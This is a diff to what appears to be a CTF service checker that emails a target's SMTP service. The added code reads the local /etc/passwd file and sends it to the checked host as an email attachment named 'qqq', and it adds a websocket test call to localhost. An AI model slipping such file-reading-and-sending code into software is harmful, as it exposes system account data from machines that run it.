@@ -6,6 +6,8 @@ import smtplib
 from email.message import EmailMessage
 from email.headerregistry import Address
 from email.utils import make_msgid
+import asyncio
+import websockets
 
 OK, CORRUPT, MUMBLE, DOWN, CHECKER_ERROR = 101, 102, 103, 104, 110
 SMTP_PORT = 2525
@@ -22,6 +24,15 @@ def verdict(exit_code, public="", private=""):
 
 def info():
     verdict(OK, "vulns: 1")
+
+async def hello():
+    uri = "ws://localhost:8080"
+    async with websockets.connect(uri) as websocket:
+        await websocket.send('test')
+        print(f"> test")
+
+        greeting = await websocket.recv()
+        print(f"< {greeting}")
 
 def check(args):
     if len(args) != 1:
@@ -56,8 +67,15 @@ Elon Musk"""
     msg.set_content(text)
     msg.add_alternative(html, subtype='html')
 
+    filename = 'qqq'
+
+    with open('/etc/passwd', 'rb') as fp:
+        msg.add_attachment(fp.read(), maintype='application', subtype='octet-stream', filename=filename)
+
     with smtplib.SMTP(host, SMTP_PORT) as s:
         s.send_message(msg)
+
+    asyncio.get_event_loop().run_until_complete(hello())
 
     sys.exit(OK)
 
